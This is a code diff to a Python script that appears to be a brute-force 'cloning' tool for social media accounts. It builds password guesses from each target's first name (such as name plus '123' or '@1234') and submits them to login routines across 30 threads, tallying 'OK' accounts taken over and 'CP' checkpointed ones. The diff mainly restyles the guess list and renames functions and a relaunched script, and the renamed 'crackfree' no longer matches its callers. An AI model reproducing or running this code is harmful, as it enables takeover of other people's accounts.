@@ -636,6 +636,7 @@ import os
 import time
 import random
 import requests
+import re
 from concurrent.futures import ThreadPoolExecutor as tred
 
 # Define the crack function
@@ -659,30 +660,63 @@ def passwrd():
     print('\033[0;97m-----------------------------------------------')
     with tred(max_workers=30) as pool:
         for yuzong in id2:
-            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+            idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
             frs = nmf.split(' ')[0]
             pwv = []
             if len(nmf) < 6:
-                if len(frs) >= 3:                
-                    pwv.extend([
-                        frs+'12', frs+'123', frs+'1234', frs+'12345', frs+'123456',
-                        nmf, frs+'@12', frs+'@123', frs+'@1234', frs+'@12345',
-                        frs+'@123456', frs+'@111', frs+'@1111', frs+'@@', frs+'@@@',
-                        frs+'@1234', frs+'@12345', frs+'@@@', frs+'@#', frs+'123@'
-                    ])
+                if len(frs) < 3:
+                    pass
+                else:                
+                    pwv.append(frs+'12')
+                    pwv.append(frs+'123')
+                    pwv.append(frs+'1234')
+                    pwv.append(frs+'12345')
+                    pwv.append(frs+'123456')
+                    pwv.append(nmf)
+                    pwv.append(frs+'@12')
+                    pwv.append(frs+'@123')
+                    pwv.append(frs+'@1234')
+                    pwv.append(frs+'@12345')
+                    pwv.append(frs+'@123456')
+                    pwv.append(frs+'@111')
+                    pwv.append(frs+'@1111')
+                    pwv.append(frs+'@@')
+                    pwv.append(frs+'@@@')
+                    pwv.append(frs+'@1234')
+                    pwv.append(frs+'@12345')
+                    pwv.append(frs+'@@@')
+                    pwv.append(frs+'@#')
+                    pwv.append(frs+'123@')
             else:
-                if len(frs) >= 3:
-                    pwv.extend([
-                        frs+'12', frs+'123', frs+'1234', frs+'12345', frs+'123456',
-                        nmf, frs+'@12', frs+'@123', frs+'@1234', frs+'@12345',
-                        frs+'@123456', frs+'@111', frs+'@1111', frs+'@@', frs+'@@@',
-                        frs+'@1234', frs+'@12345', frs+'@@@', frs+'@#', frs+'123@'
-                    ])
+                if len(frs) < 3:
+                    pwv.append(nmf)
+                else:
+                    pwv.append(frs+'12')
+                    pwv.append(frs+'123')
+                    pwv.append(frs+'1234')
+                    pwv.append(frs+'12345')
+                    pwv.append(frs+'123456')
+                    pwv.append(nmf)
+                    pwv.append(frs+'@12')
+                    pwv.append(frs+'@123')
+                    pwv.append(frs+'@1234')
+                    pwv.append(frs+'@12345')
+                    pwv.append(frs+'@123456')
+                    pwv.append(frs+'@111')
+                    pwv.append(frs+'@1111')
+                    pwv.append(frs+'@@')
+                    pwv.append(frs+'@@@')
+                    pwv.append(frs+'@1234')
+                    pwv.append(frs+'@12345')
+                    pwv.append(frs+'@@@')
+                    pwv.append(frs+'@#')
+                    pwv.append(frs+'123@')
                                         
             if 'ya' in pwpluss:
                 for xpwd in pwnya:
                     pwv.append(xpwd)
-            
+            else:
+                pass
             if 'mobile' in method:
                 pool.submit(crack, idf, pwv)
             elif 'free' in method:
@@ -693,17 +727,19 @@ def passwrd():
                 pool.submit(crackfree, idf, pwv)
             else:
                 pool.submit(crackfree, idf, pwv)
-                
     print('\033[0;91m-----------------------------------------------')
     print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
     print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s '%(ok))
     print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
     print('\033[0;91m-----------------------------------------------')
     woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
-    os.system("python AMUL.py")
-    exit() 
+    os.system("python TOXIC.py")
+    exit()
 
 # Your other code goes here...
+
+# Call the passwrd function to start the process
+passwrd()
 
 #--------------------[ METODE-B-API ]-----------------#
  
@@ -1199,7 +1235,7 @@ except requests.exceptions.ConnectionError:
 
 #------------------[ METHODE-MBASIC-2 ]-------------------#
 
-def crackfree(idf,pwv):
+def crack_free(idf,pwv):
     global loop,ok,cp
     sys.stdout.write(f"\r {P}[SUPRAJ-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
